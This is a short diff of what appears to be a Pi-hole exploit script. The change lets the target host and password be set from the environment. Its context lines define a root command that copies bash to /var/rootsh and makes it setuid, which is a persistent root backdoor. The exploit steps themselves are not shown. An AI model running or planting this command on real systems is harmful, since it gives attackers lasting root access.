@@ -32,8 +32,9 @@
 #
 # everything here is also doable from the web UI
 #
-PIHOST="http://pi.hole"
-PIPASS="password"
+PIHOST="${PIHOST:-http://pi.hole}"
+PIPASS="${PIPASS:-password}"
+
 ROOTCMD="id > /tmp/root-proof 2>&1; cp /bin/bash /var/rootsh; chmod 4755 /var/rootsh"
 
 set -eu
